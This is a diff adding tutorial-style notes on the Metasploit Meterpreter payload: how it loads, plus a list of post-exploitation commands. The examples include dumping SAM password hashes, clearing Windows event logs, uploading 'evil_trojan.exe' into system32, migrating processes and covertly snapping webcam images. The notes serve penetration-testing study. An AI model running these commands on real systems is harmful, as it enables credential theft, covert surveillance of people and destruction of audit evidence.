@@ -1,0 +1,180 @@
+Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL Injection stagers and is extended over the network at runtime.
+It communicate over the stager socket and provides a comprehensive client-side RUBY API
+
+HOW Meterpreter WORKS:
+
+1. The Target executes the initial stager. This is usually one of bind,reverse,findtag,passivex  etc
+
+2. The stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL.
+
+3. The Meterpreter core initializes, establishes a TLS/1.0 link over the socket and sends a GET.
+Metasploit recieves this GET and configures the client.
+
+4. Lastly, Meterpreter loads extensions. 
+It will always load stdapi and will load priv if the module gives administrative rights.
+All of these extensions are loaded over TLS/1.0 using a TLV protocol.
+
+Usefull Meterpreter Commands --->
+
+1. help
+
+The ‘help‘ command, as may be expected, displays the Meterpreter help menu.
+
+2. background
+
+The ‘background‘ command will send the current Meterpreter session to the background and return you to the msf prompt. To get back to your Meterpreter session, just interact with it again.
+
+
+3. cat
+
+The ‘cat‘ command is identical to the command found on *nix systems. It displays the content of a file when it’s given as an argument.
+
+
+4. cd > pwd
+
+The ‘cd‘ > ‘pwd‘ commands are used to change and display current working directly on the target host.
+The change directory “cd” works the same way as it does under DOS and *nix systems.
+By default, the current working folder is where the connection to your listener was initiated.
+
+ARGUMENTS:
+
+cd:	Path of the folder to change to
+pwd:	None required
+
+5. clearev
+
+The ‘clearev‘ command will clear the Application, System, and Security logs on a Windows system. There are no options or arguments.
+
+6. download
+
+The ‘download‘ command downloads a file from the remote machine. Note the use of the double-slashes when giving the Windows path.
+ex: download c:\\boot.ini
+
+7. edit
+
+The ‘edit‘ command opens a file located on the target host.
+It uses the ‘vim’ so all the editor’s commands are available.
+
+Example usage:
+edit edit.txt
+
+8. execute
+
+The ‘execute‘ command runs a command on the target.
+
+execute -f cmd.exe -i -H
+
+9. getuid
+
+Running ‘getuid‘ will display the user that the Meterpreter server is running as on the host.
+
+10. hashdump
+
+The ‘hashdump‘ post module will dump the contents of the SAM database.
+run post/windows/gather/hashdump 
+
+
+
+11. idletime
+
+Running ‘idletime‘ will display the number of seconds that the user at the remote machine has been idle.
+
+12. ipconfig
+
+The ‘ipconfig‘ command displays the network interfaces and addresses on the remote machine.
+
+13. lpwd > lcd
+
+The ‘lpwd‘ > ‘lcd‘ commands are used to display and change the local working directory respectively.
+When receiving a Meterpreter shell, the local working directory is the location where one started the Metasploit console.
+Changing the working directory will give your Meterpreter session access to files located in this folder.
+
+ARGUMENTS:
+
+lpwd:		None required
+lcd:		Destination folder
+
+
+14. ls
+
+As in Linux, the ‘ls‘ command will list the files in the current remote directory.
+
+15. migrate
+
+Using the ‘migrate‘ post module, you can migrate to another process on the victim.
+
+run post/windows/manage/migrate
+
+16. ps
+
+The ‘ps‘ command displays a list of running processes on the target.
+
+17. resource
+
+The ‘resource‘ command will execute Meterpreter instructions located inside a text file. Containing one entry per line, “resource” will execute each line in sequence. This can help automate repetitive actions performed by a user.
+
+By default, the commands will run in the current working directory (on target machine) and resource file in the local working directory (the attacking machine).
+
+meterpreter > resource 
+Usage: resource path1 path2Run the commands stored in the supplied files.
+
+ARGUMENTS:
+
+path1:		The location of the file containing the commands to run.
+Path2Run:	The location where to run the commands found inside the file
+
+cat resource.txt
+
+
+Running resource command: resource resource.txt
+
+18. search
+
+The ‘search‘ commands provides a way of locating specific files on the target host. The command is capable of searching through the whole system or specific folders.
+Wildcards can also be used when creating the file pattern to search for.
+
+ARGUMENTS:
+
+File pattern:	 	May contain wildcards
+Search location:	Optional, if none is given the whole system will be searched.
+
+Example: 
+search -f autoexec.bat
+
+search -f sea*.bat c:\\xamp\\
+
+19. shell
+
+The ‘shell‘ command will present you with a standard shell on the target system.
+
+20. upload
+
+As with the ‘download‘ command, you need to use double-slashes with the upload command.
+
+meterpreter > upload evil_trojan.exe c:\\windows\\system32
+
+21. webcam_list
+
+The ‘webcam_list‘ command when run from the Meterpreter shell, will display currently available web cams on the target host.
+
+Example usage:
+
+meterpreter > webcam_list
+
+22. webcam_snap
+
+The ‘webcam_snap’ command grabs a picture from a connected web cam on the target system, and saves it to disc as a JPEG image. By default, the save location is the local current working directory with a randomized filename.
+
+meterpreter > webcam_snap -h
+
+OPTIONS:
+
+-h:	Displays the help information for the command
+-i opt:	If more then 1 web cam is connected, use this option to select the device to capture the
+        image from
+-p opt:	Change path and filename of the image to be saved
+-q opt:	The imagine quality, 50 being the default/medium setting, 100 being best quality
+-v opt:	By default the value is true, which opens the image after capture.
+
+Example: webcam_snap -i 1 -v false
+
